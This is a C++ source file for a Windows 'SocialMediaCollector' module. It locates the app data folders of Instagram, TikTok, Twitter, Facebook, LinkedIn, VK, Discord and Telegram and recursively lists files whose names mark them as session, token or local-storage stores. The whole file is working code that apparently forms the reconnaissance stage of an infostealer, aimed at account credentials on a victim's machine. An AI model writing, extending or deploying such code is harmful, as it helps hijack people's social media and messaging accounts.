#include "social_media_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string SocialMediaCollector::CollectSocialMediaData() {
    std::ostringstream result;
    result << "\n=== SOCIAL MEDIA ===\n";
    
    char appdata[MAX_PATH], localappdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localappdata);
    
    std::vector<std::pair<std::string, std::string>> platforms = {
        {"Instagram", std::string(localappdata) + "\\Instagram"},
        {"TikTok", std::string(localappdata) + "\\TikTok"},
        {"Twitter", std::string(localappdata) + "\\Twitter"},
        {"Facebook", std::string(localappdata) + "\\Facebook"},
        {"LinkedIn", std::string(localappdata) + "\\LinkedIn"},
        {"VK", std::string(localappdata) + "\\VK"},
        {"Discord", std::string(appdata) + "\\discord"},
        {"Telegram", std::string(appdata) + "\\Telegram Desktop"}
    };
    
    int found = 0;
    for (const auto& [name, path] : platforms) {
        if (std::filesystem::exists(path)) {
            result << name << ": FOUND\n";
            found++;
            
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(path)) {
                    if (p.is_regular_file()) {
                        std::string filename = p.path().filename().string();
                        if (filename.find("localstorage") != std::string::npos || 
                            filename.find("session") != std::string::npos ||
                            filename.find("token") != std::string::npos ||
                            filename.find("cache") != std::string::npos) {
                            result << "  File: " << filename << "\n";
                        }
                    }
                }
            } catch (...) {
                result << "  Access denied\n";
            }
        }
    }
    
    result << "Total platforms found: " << found << "\n";
    
    return result.str();
}
